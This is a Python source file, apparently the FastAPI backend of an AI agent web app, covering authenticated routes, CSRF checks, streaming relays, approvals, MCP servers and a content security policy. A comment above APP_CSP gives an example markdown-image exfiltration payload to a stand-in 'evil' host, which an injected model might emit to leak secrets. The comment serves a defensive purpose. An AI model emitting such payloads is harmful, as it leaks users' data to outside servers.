"""The web backend's HTTP API (what the browser calls). Every route:

* needs a signed-in user (``Authenticator``); the user id sent to the engine is ALWAYS that verified email, never anything the browser sends,
* is a thin relay to one engine method (see ``PLAN.md`` M8 for the table), validating input with the same limits the engine has,
* shows the engine's real status and reason on failure (404 stays 404, "busy" stays 429 with Retry-After).

State-changing routes also need the ``X-Requested-With: pinboard`` header and a same-origin ``Origin``: a session cookie (IAP's or ours) would otherwise
let any web page make the signed-in user's browser send them (CSRF). Live output is Server-Sent Events: each engine event is one default
SSE message (``id`` = its sequence number, ``data`` = the event as JSON); ``event: end`` / ``event: error`` are control messages.
"""
from __future__ import annotations

import base64
import json
import logging
import re
import threading
import time
from collections import defaultdict
from pathlib import Path
from typing import Annotated, Any, Callable, Iterator, Literal

from fastapi import Depends, FastAPI, HTTPException, Query, Request
from fastapi import Path as P
from fastapi.responses import HTMLResponse, JSONResponse, Response, StreamingResponse
from pydantic import BaseModel, Field
from starlette.background import BackgroundTask

from pinboard.web.auth import AuthError, Authenticator
from pinboard.web.runtime_client import RuntimeCallError, RuntimeClient

log = logging.getLogger(__name__)

ID_PATTERN = r"^[A-Za-z0-9_.\-]{1,128}$"
Id = Annotated[str, P(pattern=ID_PATTERN)]  # a path id: a fresh constraint per use (one shared Path() object gets bound to a single parameter name)
CSRF_HEADER, CSRF_VALUE = "x-requested-with", "pinboard"
MAX_STREAMS_PER_USER = 6
MAX_STREAM_SECONDS = 1800.0  # one SSE connection lives at most this long; the browser reconnects with Last-Event-ID
ENGINE_STREAM_SECONDS = 270.0  # below the 300 s proven on the platform; the relay reconnects to the engine by itself


AutoApprove = bool | dict[str, Any] | None   # true / {"kinds": [...], "max_per_turn": n} = approve automatically; false / null = ask every time
McpName = Annotated[str, P(pattern=r"^[A-Za-z][A-Za-z0-9_-]{0,31}$")]


class LoginIn(BaseModel):
    credential: str = Field(min_length=20, max_length=8192)   # the Google ID token from "Sign in with Google"


class SessionIn(BaseModel):
    title: str = Field(default="", max_length=120)
    model: str | None = Field(default=None, max_length=100)
    auto_approve: AutoApprove = None


class SessionPatch(BaseModel):
    title: str | None = Field(default=None, max_length=120)
    model: str | None = Field(default=None, max_length=100)
    archived: bool | None = None
    auto_approve: AutoApprove = None


class MessageIn(BaseModel):
    text: str = Field(min_length=1, max_length=32_000)
    model: str | None = Field(default=None, max_length=100)
    auto_approve: AutoApprove = None   # only when present: replaces the session's setting (null / false = ask every time)


class McpPut(BaseModel):
    url: str = Field(max_length=2000)
    headers: dict[str, str] | None = None            # omitted = keep the stored headers; {} = clear them
    transport: Literal["http", "sse"] | None = None
    enabled: bool = True
    requires_approval: bool = True
    no_approval_tools: list[str] | None = Field(default=None, max_length=200)


class McpImport(BaseModel):
    config: str | dict[str, Any]                      # the pasted {"mcpServers": {...}} JSON, as text or as an object


class McpPatch(BaseModel):
    enabled: bool | None = None
    requires_approval: bool | None = None
    no_approval_tools: list[str] | None = Field(default=None, max_length=200)


class ScheduleIn(BaseModel):
    title: str = Field(min_length=1, max_length=200)
    instructions: str = Field(min_length=1, max_length=20_000)
    cron: str = Field(min_length=9, max_length=100)
    timezone: str = Field(default="UTC", max_length=64)
    model: str | None = Field(default=None, max_length=100)
    auto_approve: AutoApprove = None
    enabled: bool = True


class SchedulePatch(BaseModel):
    title: str | None = Field(default=None, min_length=1, max_length=200)
    instructions: str | None = Field(default=None, min_length=1, max_length=20_000)
    cron: str | None = Field(default=None, min_length=9, max_length=100)
    timezone: str | None = Field(default=None, max_length=64)
    model: str | None = Field(default=None, max_length=100)
    auto_approve: AutoApprove = None
    enabled: bool | None = None


class DecisionIn(BaseModel):
    decision: str | None = Field(default=None, pattern="^(approve|reject)$")
    message: str | None = Field(default=None, max_length=1000)
    decisions: list[dict[str, Any]] | None = None


# What the app may load. Scripts only from itself and Google's sign-in; NO remote images (an answer containing ![x](https://evil/?secret=...) would otherwise
# send what the model was tricked into putting there to a stranger's server); nothing may frame the app or change its base address.
APP_CSP = ("default-src 'self'; script-src 'self' https://accounts.google.com; style-src 'self' 'unsafe-inline' https://accounts.google.com; "
           "img-src 'self' data: https://*.googleusercontent.com; connect-src 'self' https://accounts.google.com; frame-src https://accounts.google.com; "
           "object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'")


class StreamLimiter:
    """At most N live streams per user, so one browser tab loop cannot exhaust the service."""

    def __init__(self, per_user: int):
        self.per_user, self._n, self._lock = per_user, defaultdict(int), threading.Lock()

    def reserve(self, user: str) -> Callable[[], None]:
        with self._lock:
            if self._n[user] >= self.per_user:
                raise RuntimeCallError(429, "too many open live streams; close some tabs")
            self._n[user] += 1
        released = threading.Event()

        def release() -> None:  # idempotent: called from the generator and from the response's background task
            if not released.is_set():
                released.set()
                with self._lock:
                    self._n[user] -= 1

        return release


def spa_static_files(directory: str):
    """The built React app. A path that is not a file and does not look like one (a page of the app, such as /chat/s_123) gets index.html, so deep
    links and reloads work; a missing file (/assets/x.js) and anything under /api stay real 404s."""
    from fastapi.staticfiles import StaticFiles
    from starlette.exceptions import HTTPException as StarletteHTTPException

    class SPAStaticFiles(StaticFiles):
        async def get_response(self, path, scope):
            try:
                return await super().get_response(path, scope)
            except StarletteHTTPException as exc:
                last = path.rsplit("/", 1)[-1]
                if exc.status_code == 404 and not path.startswith("api/") and "." not in last:
                    return await super().get_response("index.html", scope)
                raise

    return SPAStaticFiles(directory=directory, html=True)


def sse(data: Any = None, *, id: int | None = None, event: str | None = None, comment: str | None = None) -> str:
    if comment is not None:
        return f": {comment}\n\n"
    head = (f"id: {id}\n" if id is not None else "") + (f"event: {event}\n" if event else "")
    return head + f"data: {json.dumps(data, separators=(',', ':'))}\n\n"


def create_app(runtime: RuntimeClient, auth: Authenticator, *, static_dir: str | Path | None = None, monotonic: Callable[[], float] = time.monotonic,
               max_streams_per_user: int = MAX_STREAMS_PER_USER) -> FastAPI:
    app = FastAPI(title="pinboard-web", docs_url=None, redoc_url=None, openapi_url=None)
    limiter = StreamLimiter(max_streams_per_user)
    app.state.limiter = limiter

    # ── cross-cutting ────────────────────────────────────────────────────
    @app.exception_handler(RuntimeCallError)
    async def _runtime_error(_: Request, exc: RuntimeCallError):
        headers = {"Retry-After": "5"} if exc.status == 429 else None
        return JSONResponse({"detail": exc.message}, status_code=exc.status, headers=headers)

    @app.middleware("http")
    async def _headers(request: Request, call_next):
        response = await call_next(request)
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("Referrer-Policy", "same-origin")
        path = request.url.path
        if path.startswith("/api/"):
            response.headers.setdefault("Cache-Control", "no-store")
        elif not path.startswith(("/_diag", "/healthz")):
            response.headers.setdefault("Content-Security-Policy", APP_CSP)   # the app itself: see APP_CSP
        return response

    def csrf_check(request: Request) -> None:
        if request.method not in ("GET", "HEAD", "OPTIONS"):
            if request.headers.get(CSRF_HEADER) != CSRF_VALUE:
                raise HTTPException(403, f"missing header {CSRF_HEADER}: {CSRF_VALUE}")
            origin = request.headers.get("origin")
            if origin and not re.fullmatch(rf"https?://{re.escape(request.headers.get('host', ''))}", origin):
                raise HTTPException(403, "cross-origin request refused")

    def current_user(request: Request) -> str:
        try:
            email = auth.email(request.headers)
        except AuthError as exc:
            # say WHY (no cookie / bad signature / expired) so a failed sign-in can be diagnosed; no cookie value is ever logged
            log.warning("401 on %s %s: %s (cookie header present: %s)", request.method, request.url.path, exc, bool(request.headers.get("cookie")))
            raise HTTPException(401, str(exc)) from exc
        csrf_check(request)
        return email

    def ask(user: str, method: str, **inp: Any) -> Any:
        return runtime.call(method, {**{k: v for k, v in inp.items() if v is not None}, "user_id": user})  # the verified user always wins

    def relay_fields(user: str, method: str, body: BaseModel, **fixed: Any) -> Any:
        """Send exactly the fields the browser set (an explicit null counts: it means "back to the default" / "off"); the verified user always wins."""
        return runtime.call(method, {**body.model_dump(exclude_unset=True), **fixed, "user_id": user})


    @app.get("/healthz")
    def healthz():
        return {"status": "ok"}

    # ── signing in (the browser asks first how: nothing here needs a session) ──
    @app.get("/api/auth/config")
    def auth_config():
        return getattr(auth, "public_config", lambda: {"mode": "iap"})()

    if hasattr(auth, "login"):
        @app.post("/api/auth/google")
        def login(body: LoginIn, request: Request, response: Response):
            csrf_check(request)
            try:
                email, cookie = auth.login(body.credential)
            except AuthError as exc:
                raise HTTPException(401, str(exc)) from exc
            try:
                runtime.call("get_config", {"user_id": email})  # the engine's allow-list (policy allowed_users) is the one place that decides who may use this
            except RuntimeCallError as exc:
                if exc.status == 403:
                    raise HTTPException(403, "this Google account is not allowed to use privai") from exc
                raise
            secure = request.url.scheme == "https" or request.headers.get("x-forwarded-proto") == "https"
            response.set_cookie(auth.cookie_name, cookie, max_age=auth.lifetime, httponly=True, samesite="lax", secure=secure, path="/")
            log.info("signed in %s: session cookie issued (secure=%s) for Host=%s Origin=%s", email, secure, request.headers.get("host"), request.headers.get("origin"))
            return {"email": email}

        @app.post("/api/auth/logout")
        def logout(request: Request, response: Response):
            csrf_check(request)
            response.delete_cookie(auth.cookie_name, path="/")
            return {"signed_out": True}

    # ── who am I, models ─────────────────────────────────────────────────
    @app.get("/api/me")
    def me(user: str = Depends(current_user)):
        return ask(user, "get_config")

    @app.get("/api/models")
    def models(user: str = Depends(current_user)):
        return ask(user, "list_models")

    # ── conversations ────────────────────────────────────────────────────
    @app.get("/api/sessions")
    def list_sessions(archived: bool = False, limit: int = Query(50, ge=1, le=100), user: str = Depends(current_user)):
        return ask(user, "list_sessions", limit=limit, include_archived=archived)

    @app.post("/api/sessions")
    def create_session(body: SessionIn, user: str = Depends(current_user)):
        return relay_fields(user, "create_session", body)

    @app.get("/api/sessions/{session_id}")
    def get_session(session_id: Id, user: str = Depends(current_user)):
        return ask(user, "get_session", session_id=session_id)

    @app.patch("/api/sessions/{session_id}")
    def update_session(body: SessionPatch, session_id: Id, user: str = Depends(current_user)):
        if not body.model_dump(exclude_unset=True):  # only what the browser sent counts; an explicit null model means "back to the default"
            raise HTTPException(400, "send at least one of: title, model, archived, auto_approve")
        return relay_fields(user, "update_session", body, session_id=session_id)

    @app.get("/api/sessions/{session_id}/transcript")
    def transcript(session_id: Id, limit: int = Query(20, ge=1, le=50), before_turn_id: str | None = Query(None, pattern=ID_PATTERN),
                   user: str = Depends(current_user)):
        return ask(user, "get_transcript", session_id=session_id, limit=limit, before_turn_id=before_turn_id)

    @app.post("/api/sessions/{session_id}/warm")
    def warm(session_id: Id, user: str = Depends(current_user)):
        """Call when the user starts typing: prepares a sandbox in the background so the first file/shell use is instant. Safe to repeat."""
        return ask(user, "warm_sandbox", session_id=session_id)

    @app.post("/api/sessions/{session_id}/messages")
    def send_message(body: MessageIn, session_id: Id, user: str = Depends(current_user)):
        return relay_fields(user, "send_message", body, session_id=session_id)

    # ── turns ────────────────────────────────────────────────────────────
    @app.get("/api/turns/{turn_id}")
    def get_turn(turn_id: Id, user: str = Depends(current_user)):
        return ask(user, "get_turn", turn_id=turn_id)

    @app.get("/api/turns/{turn_id}/events")
    def get_events(turn_id: Id, after_seq: int = Query(0, ge=0), limit: int = Query(500, ge=1, le=1000), user: str = Depends(current_user)):
        return ask(user, "get_events", turn_id=turn_id, after_seq=after_seq, limit=limit)

    @app.post("/api/turns/{turn_id}/cancel")
    def cancel_turn(turn_id: Id, user: str = Depends(current_user)):
        return ask(user, "cancel_turn", turn_id=turn_id)

    @app.post("/api/turns/{turn_id}/resume")
    def resume_turn(turn_id: Id, user: str = Depends(current_user)):
        return ask(user, "resume_turn", turn_id=turn_id)

    @app.get("/api/turns/{turn_id}/audit")
    def audit(turn_id: Id, user: str = Depends(current_user)):
        return ask(user, "get_audit", run_id=turn_id)

    @app.get("/api/turns/{turn_id}/stream")
    def stream(request: Request, turn_id: Id, after_seq: int = Query(0, ge=0), user: str = Depends(current_user)):
        last = request.headers.get("last-event-id", "")
        if last.isdigit():  # the browser's EventSource reconnects by itself and says where it got to
            after_seq = max(after_seq, int(last))
        ask(user, "get_turn", turn_id=turn_id)  # 404 / 403 are real statuses, decided before the stream starts
        release = limiter.reserve(user)
        return StreamingResponse(relay(user, turn_id, after_seq, release), media_type="text/event-stream", background=BackgroundTask(release),
                                 headers={"Cache-Control": "no-cache, no-transform", "X-Accel-Buffering": "no"})

    def relay(user: str, turn_id: str, seq: int, release: Callable[[], None]) -> Iterator[str]:
        started = monotonic()
        try:
            yield "retry: 3000\n\n"
            while True:
                again = False
                for ev in runtime.stream("stream_turn", {"user_id": user, "turn_id": turn_id, "after_seq": seq,
                                                         "heartbeat_seconds": 10, "max_seconds": ENGINE_STREAM_SECONDS}):
                    kind = ev.get("type")
                    if kind == "heartbeat":
                        yield sse(comment="keep-alive")
                    elif kind == "reconnect":  # the engine's stream time is up: carry on from where we were, the browser notices nothing
                        seq, again = int(ev.get("after_seq", seq)), True
                    else:
                        seq = int(ev.get("seq", seq))
                        yield sse(ev, id=seq)
                if not again:
                    yield sse({"after_seq": seq, "reason": "finished"}, event="end")
                    return
                if monotonic() - started > MAX_STREAM_SECONDS:
                    yield sse({"after_seq": seq, "reason": "time"}, event="end")  # the browser reconnects with Last-Event-ID
                    return
        except RuntimeCallError as exc:
            yield sse({"status": exc.status, "message": exc.message, "after_seq": seq}, event="error")
        except Exception:  # noqa: BLE001  never leave the browser hanging on a relay bug
            log.exception("stream relay failed for turn %s", turn_id)
            yield sse({"status": 502, "message": "the live connection failed", "after_seq": seq}, event="error")
        finally:
            release()

    # ── approvals ────────────────────────────────────────────────────────
    @app.get("/api/approvals")
    def approvals(status: str | None = Query(None, pattern="^(pending|approved|rejected|expired)$"),
                  session_id: str | None = Query(None, pattern=ID_PATTERN), user: str = Depends(current_user)):
        return ask(user, "list_approvals", status=status, session_id=session_id)

    @app.post("/api/approvals/{approval_id}/decision")
    def decide(body: DecisionIn, approval_id: Id, user: str = Depends(current_user)):
        return ask(user, "decide", approval_id=approval_id, decision=body.decision, message=body.message, decisions=body.decisions)

    # ── saved files ──────────────────────────────────────────────────────
    @app.get("/api/artifacts")
    def artifacts(session_id: str | None = Query(None, pattern=ID_PATTERN), limit: int = Query(50, ge=1, le=200), user: str = Depends(current_user)):
        return ask(user, "list_artifacts", session_id=session_id, limit=limit)

    @app.get("/api/artifacts/{artifact_id}")
    def artifact(artifact_id: Id, user: str = Depends(current_user)):
        return ask(user, "get_artifact", artifact_id=artifact_id)

    @app.get("/api/artifacts/{artifact_id}/url")
    def artifact_url(artifact_id: Id, seconds: int = Query(600, ge=30, le=3600), user: str = Depends(current_user)):
        return ask(user, "get_artifact_url", artifact_id=artifact_id, seconds=seconds)

    @app.get("/api/artifacts/{artifact_id}/content")
    def artifact_content(artifact_id: Id, user: str = Depends(current_user)):
        res = ask(user, "read_artifact", artifact_id=artifact_id)
        meta, data = res["artifact"], base64.b64decode(res["content_base64"])
        safe = "".join(ch for ch in str(meta.get("name", "")) if ch.isalnum() or ch in "._- ")[:100] or "download"
        return Response(data, media_type=meta.get("content_type") or "application/octet-stream",
                        headers={"Content-Disposition": f'attachment; filename="{safe}"', "X-Content-Type-Options": "nosniff"})

    # ── bring-your-own MCP servers ───────────────────────────────────────
    @app.get("/api/mcp/servers")
    def mcp_servers(user: str = Depends(current_user)):
        return ask(user, "list_mcp_servers")

    @app.post("/api/mcp/import")
    def mcp_import(body: McpImport, user: str = Depends(current_user)):
        return ask(user, "import_mcp_config", config=body.config)

    @app.put("/api/mcp/servers/{name}")
    def mcp_put(body: McpPut, name: McpName, user: str = Depends(current_user)):
        return relay_fields(user, "put_mcp_server", body, name=name)

    @app.patch("/api/mcp/servers/{name}")
    def mcp_patch(body: McpPatch, name: McpName, user: str = Depends(current_user)):
        if not body.model_dump(exclude_unset=True):
            raise HTTPException(400, "send at least one of: enabled, requires_approval, no_approval_tools")
        return relay_fields(user, "update_mcp_server", body, name=name)

    @app.post("/api/mcp/servers/{name}/test")
    def mcp_test(name: McpName, user: str = Depends(current_user)):
        return ask(user, "test_mcp_server", name=name)

    @app.delete("/api/mcp/servers/{name}")
    def mcp_delete(name: McpName, user: str = Depends(current_user)):
        return ask(user, "delete_mcp_server", name=name)

    # ── scheduled tasks ──────────────────────────────────────────────────
    @app.get("/api/schedules")
    def schedules(user: str = Depends(current_user)):
        return ask(user, "list_schedules")

    @app.post("/api/schedules")
    def schedule_create(body: ScheduleIn, user: str = Depends(current_user)):
        return relay_fields(user, "create_schedule", body)

    @app.patch("/api/schedules/{schedule_id}")
    def schedule_update(body: SchedulePatch, schedule_id: Id, user: str = Depends(current_user)):
        if not body.model_dump(exclude_unset=True):
            raise HTTPException(400, "send at least one field to change")
        return relay_fields(user, "update_schedule", body, schedule_id=schedule_id)

    @app.delete("/api/schedules/{schedule_id}")
    def schedule_delete(schedule_id: Id, user: str = Depends(current_user)):
        return ask(user, "delete_schedule", schedule_id=schedule_id)

    @app.post("/api/schedules/{schedule_id}/run")
    def schedule_run(schedule_id: Id, user: str = Depends(current_user)):
        return ask(user, "run_schedule_now", schedule_id=schedule_id)

    @app.get("/api/schedules/{schedule_id}/runs")
    def schedule_runs(schedule_id: Id, limit: int = Query(20, ge=1, le=100), user: str = Depends(current_user)):
        return ask(user, "list_schedule_runs", schedule_id=schedule_id, limit=limit)

    @app.get("/_diag", response_class=HTMLResponse)
    def diagnostics(user: str = Depends(current_user)):
        """A plain page for checking sign-in and live streaming from a real browser (the real app replaces it). Needs a signed-in user like everything else."""
        return HTMLResponse((Path(__file__).parent / "diag.html").read_text())

    @app.get("/_diag/hold")
    def hold(seconds: float = Query(60, ge=1, le=1800), every: float = Query(5, ge=0.1, le=30), user: str = Depends(current_user)):
        """Holds a live stream open for ``seconds`` (a tick every ``every`` seconds, a keep-alive between) so the limits of whatever sits in front
        of this service (Cloud Run, IAP, a browser) can be measured. Needs a signed-in user; costs nothing but a connection."""
        def ticks() -> Iterator[str]:
            started, n = monotonic(), 0
            yield "retry: 3000\n\n"
            while monotonic() - started < seconds:
                time.sleep(every)
                n += 1
                yield sse({"tick": n, "elapsed": round(monotonic() - started, 1)}, id=n)
                yield sse(comment="keep-alive")
            yield sse({"ticks": n, "elapsed": round(monotonic() - started, 1)}, event="end")
        return StreamingResponse(ticks(), media_type="text/event-stream", headers={"Cache-Control": "no-cache, no-transform", "X-Accel-Buffering": "no"})

    # ── the React app (built files), when present ────────────────────────
    if static_dir and Path(static_dir).is_dir():
        app.mount("/", spa_static_files(str(static_dir)), name="static")
    return app
